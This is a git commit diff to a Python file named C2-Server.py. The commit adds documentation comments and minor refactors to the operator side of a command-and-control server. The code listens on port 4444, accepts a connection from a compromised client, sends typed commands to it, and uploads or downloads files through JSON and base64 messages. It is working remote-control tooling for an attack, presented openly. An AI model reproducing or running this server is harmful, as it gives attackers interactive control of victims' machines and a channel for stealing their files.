213b4493b851d32aed4666839202ff44b2432f1e
Joseph Merigala <104745031+13HJoe@users.noreply.github.com>
2024-08-06 11:02:41 +0530

    Update C2-Server.py - Added Docs

--- C2-Server.py
+++ C2-Server.py
@@ -1,18 +1,43 @@
 import socket
 import json
+import sys
 import base64
 
 class Server:
     def __init__(self, ip, port):
+        # create a server socket object  
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock_obj.bind((ip,port))
+
+    '''
+            --------------------------------------------------------------------------------
+            TRANSMIT
+                    -> `string` type is converted to JSON for serialization
+                    ->  the JSON data is then encoded as UTF-8 for transmission over TCP
+            RECIEVE
+                    -> UTF-8 encoded data is decoded to obtain serialized JSON data
+                    -> JSON is converted back to `string` type
+
+            `note`: - for files; the binary data is converted to base64 strings before being
+                        converted to JSON
+                        - at the reciever's end they are decode back from base64 strings to
+                        binary streams
+                    - for commands; convert them to a list before transmission
+            
+            Server-Side
+                Uploading files -> ["upload",<filename>,<file-data>]
+                Download -> ["download",<filename>]
+                         -> Response - base64 encoded data                         
+                
+            ---------------------------------------------------------------------------------
+
+    '''
+    
     def reliable_send(self, data):
-        # list elements must 'str'
         for i in range(len(data)):
             x = data[i]
             if not isinstance(x, str):
                 data[i] = x.decode('utf-8')
-        # convert list to JSON | encode JSON for TCP trans.
         json_data = json.dumps(data).encode('utf-8')
         self.client_obj.send(json_data)
     def reliable_receive(self):
@@ -25,6 +50,7 @@ class Server:
                 return json.loads(json_data)
             except:
                 continue
+    
     def read_file(self, path):
         try:
             with open(path, 'rb') as file_obj:
@@ -38,10 +64,13 @@ class Server:
                 return "[+] File downloaded successfully"
         except:
             return "[+] ERROR - Error during creating a file"    
+    
+    
     def run(self):
         print("[+] Waiting for an Incoming Connection")
-        self.sock_obj.listen(1)
-        self.client_obj, ip_addr = self.sock_obj.accept()
+        self.sock_obj.listen(1) 
+        # Maximum no of Unaccepted Connections that can be allowed before the system stops Listening - listen(1)
+        self.client_obj, ip_addr = self.sock_obj.accept() 
         print("[+] Recieved a connection from -> "+str(ip_addr))
         while True:
             cmd = input(">> ").split()
@@ -50,9 +79,11 @@ class Server:
             if cmd[0] == "exit":
                 self.reliable_send(cmd)
                 self.client_obj.close()
-                exit()
+                print("[+] Closing Socket Object \n[+] Closing the connection")
+                sys.exit(0)
             if cmd[0] == "upload":
-                data = self.read_file(cmd[1].split('/')[-1])
+                filename = cmd[1].split('/')[-1]
+                data = self.read_file(filename)
                 if "ERROR" == data[4:9]:
                     print(data)
                     continue
@@ -64,6 +95,9 @@ class Server:
                 continue
             print(response)
 
-# MAIN
-C2 = Server(socket.gethostname(), 4444)
+#-----------------------------MAIN-----------------------------------#
+
+# gets the local IP address of the machine
+IP = socket.gethostname()
+C2 = Server(IP, 4444)
 C2.run()
